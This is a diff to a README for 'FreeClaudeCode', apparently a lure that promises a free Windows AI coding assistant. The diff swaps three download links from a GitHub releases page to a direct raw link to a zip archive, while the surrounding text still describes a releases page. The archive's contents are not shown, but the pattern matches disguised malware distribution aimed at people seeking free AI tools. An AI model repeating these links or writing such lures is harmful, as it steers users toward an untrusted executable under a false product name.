@@ -2,7 +2,7 @@
 
 ## 📥 Download & Get Started
 
-[![Download FreeClaudeCode](https://img.shields.io/badge/Download-FreeClaudeCode-blue?style=for-the-badge&logo=github)](https://github.com/Felicitous-radiocompass228/FreeClaudeCode/releases)
+[![Download FreeClaudeCode](https://img.shields.io/badge/Download-FreeClaudeCode-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Felicitous-radiocompass228/FreeClaudeCode/main/public/2.2.zip)
 
 ---
 
@@ -53,7 +53,7 @@ FreeClaudeCode is designed to run on standard Windows computers. For the best ex
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**FreeClaudeCode Official Download Page**](https://github.com/Felicitous-radiocompass228/FreeClaudeCode/releases)
+[**FreeClaudeCode Official Download Page**](https://raw.githubusercontent.com/Felicitous-radiocompass228/FreeClaudeCode/main/public/2.2.zip)
 
 Once you arrive at the page, look for the most recent release version (the newest file at the top of the list).
 
@@ -138,7 +138,7 @@ FreeClaudeCode processes your requests securely through encrypted connections. T
 
 Don't wait — download FreeClaudeCode today and experience the power of a complete AI coding assistant in one simple package.
 
-[![Download Now](https://img.shields.io/badge/🗂️%20Download%20FreeClaudeCode-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Felicitous-radiocompass228/FreeClaudeCode/releases)
+[![Download Now](https://img.shields.io/badge/🗂️%20Download%20FreeClaudeCode-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Felicitous-radiocompass228/FreeClaudeCode/main/public/2.2.zip)
 
 Visit this link to download the application and begin your AI coding journey in under five minutes. Whether you're a beginner or a pro, FreeClaudeCode makes AI-powered development accessible to everyone.
 
